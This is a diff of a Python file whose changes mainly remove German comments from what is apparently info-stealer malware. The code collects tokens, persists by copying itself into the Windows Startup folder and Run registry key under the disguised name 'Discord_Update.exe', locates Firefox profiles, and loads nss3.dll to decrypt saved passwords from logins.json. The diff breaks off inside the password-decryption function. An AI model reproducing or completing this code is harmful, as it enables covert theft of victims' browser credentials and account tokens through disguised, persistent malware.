@@ -21,7 +21,6 @@ try:
 except:
     SCREENSHOT_ENABLED = False
 
-# Für Firefox NSS-Bibliothek
 try:
     import ctypes
     from ctypes import c_uint, c_void_p, c_char_p, Structure, POINTER, cast, byref, create_string_buffer, string_at
@@ -33,7 +32,6 @@ tokens = []
 cleaned = []
 checker = []
 
-# Konstanten für Firefox Passwortentschlüsselung
 if FIREFOX_SUPPORTED:
     try:
         class NSSItem(Structure):
@@ -47,33 +45,25 @@ if FIREFOX_SUPPORTED:
     except:
         FIREFOX_SUPPORTED = False
 
-# Funktion zum Hinzufügen zur Autostart-Ordner
 def add_to_startup():
     try:
-        # Pfad zur ausführbaren Datei
         exe_path = sys.executable
         
-        # Wenn es sich nicht um eine .exe handelt (z.B. während der Entwicklung), überspringen
         if not exe_path.endswith('.exe'):
             return False
             
-        # Kopiere die Datei in den Autostart-Ordner
         startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         if not os.path.exists(startup_folder):
             os.makedirs(startup_folder)
             
         target_path = os.path.join(startup_folder, 'Discord_Update.exe')
         
-        # Kopiere nur, wenn die Datei noch nicht existiert oder sich geändert hat
         if not os.path.exists(target_path) or not files_are_same(exe_path, target_path):
             shutil.copy2(exe_path, target_path)
             
-        # Alternative Methode über Registry
         key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
         try:
-            # Öffne Registry-Schlüssel
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
-            # Setze Wert
             winreg.SetValueEx(key, 'Discord_Update', 0, winreg.REG_SZ, exe_path)
             winreg.CloseKey(key)
         except Exception as e:
@@ -84,14 +74,11 @@ def add_to_startup():
         print(f"Error adding to startup: {str(e)}")
         return False
 
-# Hilfsfunktion zum Vergleichen von Dateien
 def files_are_same(file1, file2):
     try:
-        # Vergleiche Dateigröße und Änderungsdatum
         stat1 = os.stat(file1)
         stat2 = os.stat(file2)
         
-        # Wenn Größe und Änderungsdatum gleich sind, sind die Dateien wahrscheinlich identisch
         return stat1.st_size == stat2.st_size and abs(stat1.st_mtime - stat2.st_mtime) < 10
     except:
         return False
@@ -108,7 +95,6 @@ def get_firefox_profiles(profile_path):
     if not os.path.exists(profile_path):
         return profiles
         
-    # Versuche, profiles.ini zu lesen
     profiles_ini = os.path.join(profile_path, 'profiles.ini')
     if os.path.exists(profiles_ini):
         profile_folders = []
@@ -124,13 +110,11 @@ def get_firefox_profiles(profile_path):
         except:
             pass
             
-        # Füge gefundene Profile hinzu
         for folder in profile_folders:
             full_path = os.path.join(profile_path, folder)
             if os.path.exists(full_path):
                 profiles.append(full_path)
     
-    # Suche auch direkt nach Profilordnern, falls profiles.ini fehlt oder unvollständig ist
     if not profiles:
         for item in os.listdir(profile_path):
             if item.endswith('.default') or item.endswith('.normal'):
@@ -146,21 +130,17 @@ def init_nss_for_firefox(firefox_dir, profile_path):
         return None
         
     try:
-        # Versuche die NSS-Bibliothek zu laden
         nss_paths = [
             os.path.join(firefox_dir, 'nss3.dll'),
             os.path.join(firefox_dir, 'softokn3.dll'),
             os.path.join(firefox_dir, 'freebl3.dll'),
         ]
         
-        # Überprüfe, ob die Dateien existieren
         if not all(os.path.exists(path) for path in nss_paths):
             return None
             
-        # Lade die NSS-Bibliothek
         nss = ctypes.CDLL(os.path.join(firefox_dir, 'nss3.dll'))
-        
-        # Deklariere die benötigten Funktionen
+
         nss.PK11_GetInternalKeySlot.restype = c_void_p
         nss.PK11_CheckUserPassword.argtypes = [c_void_p, c_char_p]
         nss.PK11_CheckUserPassword.restype = c_uint
@@ -171,17 +151,14 @@ def init_nss_for_firefox(firefox_dir, profile_path):
         nss.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
         nss.PK11SDR_Decrypt.restype = c_uint
         
-        # Initialisiere NSS mit dem Firefox-Profilverzeichnis
         if nss.NSS_Init(create_string_buffer(profile_path.encode())) != 0:
             return None
             
-        # Hole Key Slot
         slot = nss.PK11_GetInternalKeySlot()
         if slot is None:
             nss.NSS_Shutdown()
             return None
             
-        # Überprüfe den Passwort-Status (sollte ohne Passwort funktionieren)
         if nss.PK11_CheckUserPassword(slot, create_string_buffer(b'')) != 0:
             nss.PK11_FreeSlot(slot)
             nss.NSS_Shutdown()
@@ -200,14 +177,12 @@ def decrypt_firefox_passwords(firefox_dir, profile_path):
     passwords = []
     
     try:
-        # Initialisiere NSS
         nss = init_nss_for_firefox(firefox_dir, profile_path)
         if nss is None:
             print(f"Failed to initialize NSS for profile {profile_path}")
             return []
             
         try:
-            # Suche nach der logins.json Datei
             logins_path = os.path.join(profile_path, 'logins.json')
             if not os.path.exists(logins_path):
                 # Versuche alternative Dateinamen
